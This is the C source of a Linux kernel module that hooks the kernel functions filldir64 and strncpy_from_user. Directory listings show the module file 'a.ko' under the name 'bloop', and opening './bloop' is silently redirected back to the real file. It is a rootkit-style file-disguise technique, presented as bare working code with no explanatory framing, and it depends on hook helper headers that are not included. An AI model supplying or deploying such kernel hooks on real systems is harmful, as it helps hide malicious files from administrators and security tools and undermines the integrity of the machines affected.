#include <linux/delay.h>
#include <linux/skbuff.h>
#include <linux/dirent.h>
#include <linux/limits.h>

#include <asm/uaccess.h>

#include "hook_struct.h"
#include "hook_function.h"

#define ORIGINAL_FILE_NAME "a.ko"
#define REPLACEMENT_FILE_NAME "bloop"

struct hook * filldir64_hook_struct = NULL;
struct hook * strncpy_from_user_hook_struct = NULL;

int (*filldir64_real)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = NULL;
long (*strncpy_from_user_real)(char *dst, const char __user *src, long count) = NULL;

static long strncpy_from_user_hook(char *dst, const char __user *src, long count) {
    long res = strncpy_from_user_real(dst, src, count);
    if (res < 0 || strcmp("./" REPLACEMENT_FILE_NAME, dst)) {
        return res;
    }

    strcpy(dst, "./" ORIGINAL_FILE_NAME);
    return sizeof("./" ORIGINAL_FILE_NAME);
}

static int filldir64_hook(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    printk("name: %s\n", name);

    if (!strcmp(ORIGINAL_FILE_NAME, name)) {
        return filldir64_real(ctx, REPLACEMENT_FILE_NAME, sizeof(REPLACEMENT_FILE_NAME), offset, ino, d_type);
    }

    return filldir64_real(ctx, name, namlen, offset, ino, d_type);
}

bool hook_function_init(void) {
    filldir64_hook_struct = create_hook_name("filldir64", (unsigned long)filldir64_hook);
    if (NULL == filldir64_hook_struct) {
        return false;
    }

    filldir64_real = (void *)filldir64_hook_struct->call_original_function;

    strncpy_from_user_hook_struct = create_hook_name("strncpy_from_user", (unsigned long)strncpy_from_user_hook);
    if (NULL == strncpy_from_user_hook_struct) {
        return false;
    }

    strncpy_from_user_real = (void *)strncpy_from_user_hook_struct->call_original_function;

    install_hook(filldir64_hook_struct);
    install_hook(strncpy_from_user_hook_struct);

    return true;
}

void hook_function_exit(void) {
    if (NULL == filldir64_hook_struct || NULL == strncpy_from_user_hook_struct) {
        return;
    }

    remove_hook(filldir64_hook_struct);
    remove_hook(strncpy_from_user_hook_struct);

    // wait for all threads and shit to finish before free the hook
    msleep(1000);

    kfree(filldir64_hook_struct);
    filldir64_hook_struct = NULL;

    kfree(strncpy_from_user_hook_struct);
    strncpy_from_user_hook_struct = NULL;
}